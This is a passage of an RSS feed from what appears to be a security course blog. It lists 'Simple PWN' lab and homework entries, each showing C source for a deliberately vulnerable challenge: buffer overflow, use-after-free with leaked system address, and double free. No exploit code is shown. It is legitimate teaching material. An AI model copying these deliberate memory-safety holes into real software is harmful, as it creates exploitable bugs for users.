if(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;filterprog)==-1){ perror("Seccomp Error"); exit(1); } return; } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); apply_seccomp(); char buf2[0x30]; // long n2 = 0x30; // char msg[0x20]; char name[0x20]; // long n = 20; n2 = 0x30; n = 20; printf("Haaton's name? "); n = read(0, name, n); name[n] = 0; strcpy(msg, name); strcat(msg, " hachamachama"); puts(msg); puts("ECHO HACHAMA!"); while (1) { read(0, buf2, n2); if (strcmp(buf2, "HACHAMA") == 0) write(1, buf2, n2); else break; } return 0; } :::</description></item><item><title>Simple PWN 0x38(Lab - UAF)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/index.html</guid><description>Simple PWN 0x38(Lab - UAF) Background Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> void default_handle(char *event) { printf("EVENT: get event named \"%s\"!\n", event); } struct entity { char *name; char *event; void (*event_handle)(char *); }; struct entity *entities[0x10]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } int get_idx() { int idx = read_int(); if (idx >= 0x10 || idx &lt; 0) exit(0); return idx; } void memu() { puts("1. register entity"); puts("2. delete entity"); puts("3. set name"); puts("4. trigger event"); printf("choice: "); } void register_entity() { int idx; printf("Index: "); idx = get_idx(); entities[idx] = malloc(sizeof(struct entity)); entities[idx]->event_handle = default_handle; entities[idx]->event = "Default Event"; } void delete_entity() { int idx; printf("Index: "); idx = get_idx(); if (entities[idx]) { free(entities[idx]->name); free(entities[idx]); } else puts("Invalid index"); } void set_name() { int idx; int len; printf("Index: "); idx = get_idx(); if (entities[idx]) { printf("Nmae Length: "); len = read_int(); if (len == 0) exit(0); entities[idx]->name = malloc(len); printf("Name: "); read(0, entities[idx]->name, len - 1); } else puts("Invalid index"); } void trigger_event() { int idx; printf("Index: "); idx = get_idx(); if (entities[idx]) { printf("Name: %s\n", entities[idx]->name); entities[idx]->event_handle(entities[idx]->event); } } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); printf("gift1: %p\n", &amp;system); void *ptr = malloc(0x10); printf("gift2: %p\n", ptr); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: register_entity(); break; case 2: delete_entity(); break; case 3: set_name(); break; case 4: trigger_event(); default: puts("Invalid command"); } } return 0; } :::</description></item><item><title>Simple PWN 0x39(Lab - Double Free)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/index.html</guid><description>Simple PWN 0x39(Lab - Double Free) Background 0x18(Lab - babynote)
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;fcntl.h> struct note { char *content; unsigned long len; }; struct note notes[0x10]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } unsigned long read_ul() { char buf[0x20]; read(0, buf, 0x1f); return strtoul(buf, NULL, 10); } int get_idx() { int idx = read_int(); if (idx >= 0x10 || idx &lt; 1) exit(0); return idx; } void add_note() { int idx; printf("Index: "); idx = get_idx(); printf("Length: "); notes[idx].len = read_ul(); notes[idx].content = malloc(notes[idx].len); puts("Add done"); } void read_note() { int idx; printf("Index: "); idx = get_idx(); printf("Note[%d]:\n", idx); write(1, notes[idx].content, notes[idx].len); } void write_note() { int idx; printf("Index: "); idx = get_idx(); printf("Content: "); read(0, notes[idx].content, notes[idx].len); } void delete_note() { int idx; printf("Index: "); idx = get_idx(); free(notes[idx].content); puts("Delete done"); } void memu() { puts("1. add note"); puts("2. read note"); puts("3. write note"); puts("4. delete note"); printf("choice: "); } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); int fd = open("./flag.txt", O_RDONLY); notes[0].len = 0x30; notes[0].content = malloc(0x30); read(fd, notes[0].content, 0x30); close(fd); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: add_note(); break; case 2: read_note(); break; case 3: write_note(); break; case 4: delete_note(); break; default: puts("Invalid command"); } } return 0; } :::</description></item><item><title>Simple PWN 0x40(2023 HW - UAF++)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/index.html</guid><description>Simple PWN 0x40(2023 HW - UAF++) Background 0x34(2023 Lab - UAF):three:
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> void default_handle(char *event) { printf("EVENT: get event named \"%s\"!\n", event); } struct entity { char *name; char *event; void (*event_handle)(char *); }; struct entity *entities[0x2]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } int get_idx() { int idx = read_int(); if (idx >= 0x2 || idx &lt; 0) exit(0); return idx; } void memu() { puts("1. register entity"); puts("2. delete entity"); puts("3. trigger event"); printf("choice: "); } void register_entity() { int idx; int len; printf("Index: "); idx = get_idx(); entities[idx] = malloc(sizeof(struct entity)); entities[idx]->event = "Default Event"; entities[idx]->event_handle = default_handle; printf("Nmae Length: "); len = read_int(); if (len == 0 || len > 0x430) exit(0); entities[idx]->name = malloc(len); printf("Name: "); read(0, entities[idx]->name, len - 1); } void delete_entity() { int idx; printf("Index: "); idx = get_idx(); if (entities[idx]) { free(entities[idx]->name); free(entities[idx]); } else puts("Invalid index"); } void trigger_event() { int idx; printf("Index: "); idx = get_idx(); if (entities[idx]) { printf("Name: %s\n", entities[idx]->name); entities[idx]->event_handle(entities[idx]->event); } } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: register_entity(); break; case 2: delete_entity(); break; case 3: trigger_event(); default: puts("Invalid command"); } } return 0; } :::</description></item></channel></rss>